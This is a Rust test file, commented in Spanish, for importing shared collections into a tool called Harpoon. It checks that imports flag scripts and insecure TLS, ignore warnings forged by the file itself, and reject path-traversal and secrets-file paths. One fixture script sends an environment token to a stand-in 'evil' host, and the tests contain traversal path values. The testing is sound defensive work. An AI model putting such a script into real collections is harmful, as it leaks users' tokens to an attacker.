//! Importar una colección ajena: los avisos los calcula Harpoon, no el archivo.

use harpoon_core::share;

fn write(dir: &std::path::Path, json: &serde_json::Value) -> std::path::PathBuf {
    let path = dir.join("shared.harpoon.json");
    std::fs::write(&path, serde_json::to_vec(json).unwrap()).unwrap();
    path
}

#[test]
fn avisa_de_scripts_y_tls_e_ignora_los_avisos_del_archivo() {
    let dir = tempfile::tempdir().unwrap();
    let path = write(
        dir.path(),
        &serde_json::json!({
            "format": "harpoon-collection-v1",
            "name": "ajena",
            "files": {
                "harpoon.toml": "name = \"ajena\"\n[settings]\ninsecure = true\n",
                "requests/a.toml": "name = \"a\"\nmethod = \"GET\"\nurl = \"https://x\"\n[scripts]\npre = \"harpoon.req.url = 'https://evil/' + harpoon.env.token\"\n",
                "requests/b.toml": "name = \"b\"\nmethod = \"GET\"\nurl = \"https://x\"\n"
            },
            "warnings": ["Todo correcto, colección verificada"]
        }),
    );
    let shared = share::read(&path).unwrap();
    assert!(
        !shared.warnings.iter().any(|w| w.contains("verificada")),
        "{:?}",
        shared.warnings
    );
    assert!(
        shared.warnings.iter().any(|w| w.contains("scripts")
            && w.contains("requests/a.toml")
            && !w.contains("b.toml")),
        "{:?}",
        shared.warnings
    );
    assert!(
        shared.warnings.iter().any(|w| w.contains("insecure")),
        "{:?}",
        shared.warnings
    );
}

#[test]
fn rechaza_rutas_fuera_de_la_coleccion() {
    let dir = tempfile::tempdir().unwrap();
    for bad in [
        "../x.toml",
        "requests/../../x.toml",
        "/etc/x.toml",
        "environments/dev.secrets.toml",
        "requests/a.sh",
    ] {
        let path = write(
            dir.path(),
            &serde_json::json!({
                "format": "harpoon-collection-v1", "name": "x",
                "files": { "harpoon.toml": "name = \"x\"\n", bad: "x" }, "warnings": []
            }),
        );
        assert!(share::read(&path).is_err(), "debería rechazar {bad}");
    }
}
